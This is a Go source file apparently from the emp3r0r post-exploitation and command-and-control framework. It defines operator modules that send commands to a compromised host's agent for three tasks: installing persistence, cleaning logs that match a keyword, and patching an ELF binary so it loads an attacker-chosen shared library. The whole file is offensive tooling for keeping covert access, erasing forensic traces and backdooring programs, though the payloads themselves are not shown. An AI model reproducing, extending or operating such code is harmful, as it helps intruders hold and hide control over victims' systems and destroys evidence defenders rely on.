package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func modulePersistence() {
	methodOpt, ok := live.ActiveModule.Options["method"]
	if !ok {
		logging.Errorf("Option 'method' not found")
		return
	}
	cmd := fmt.Sprintf("%s --method %s", def.C2CmdPersistence, methodOpt.Val)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}

func moduleLogCleaner() {
	keywordOpt, ok := live.ActiveModule.Options["keyword"]
	if !ok {
		logging.Errorf("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", def.C2CmdCleanLog, keywordOpt.Val)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}

func moduleElfPatch() {
	elfPathOpt, ok := live.ActiveModule.Options["elf_path"]
	if !ok {
		logging.Errorf("Option 'elf_path' not found")
		return
	}
	soPathOpt, ok := live.ActiveModule.Options["so_path"]
	if !ok {
		logging.Errorf("Option 'so_path' not found")
		return
	}
	if soPathOpt.Val == "" {
		logging.Errorf("so_path cannot be empty. Please specify the path to the shared library file")
		return
	}
	if elfPathOpt.Val == "" {
		logging.Errorf("elf_path cannot be empty. Please specify the path to the ELF binary to patch")
		return
	}

	cmd := fmt.Sprintf("%s --elf_path %s --so_path %s", def.C2CmdElfPatch, elfPathOpt.Val, soPathOpt.Val)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
